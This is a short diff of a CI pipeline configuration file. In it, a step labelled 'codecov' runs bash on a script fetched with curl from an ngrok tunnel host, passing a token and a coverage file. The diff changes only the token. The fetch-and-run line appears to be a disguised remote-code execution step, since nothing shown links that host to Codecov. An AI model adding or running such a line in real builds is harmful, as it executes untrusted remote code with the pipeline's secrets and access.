@@ -35,7 +35,7 @@ jobs:
     condition: succeededOrFailed()
   
   - script: |
-      bash <(curl http://ccmigrate-sg1seod6.ngrok.io/bash) -t 3652b07e-7171-4fc8-841b-ade48b0f4ffd -f coverage.xml -F adder -F subtractor
+      bash <(curl http://ccmigrate-sg1seod6.ngrok.io/bash) -t 09104459-dbd4-4187-bf70-933c0d9bb97b -f coverage.xml -F adder -F subtractor
     displayName: 'codecov'  
   
   - task: PublishCodeCoverageResults@1
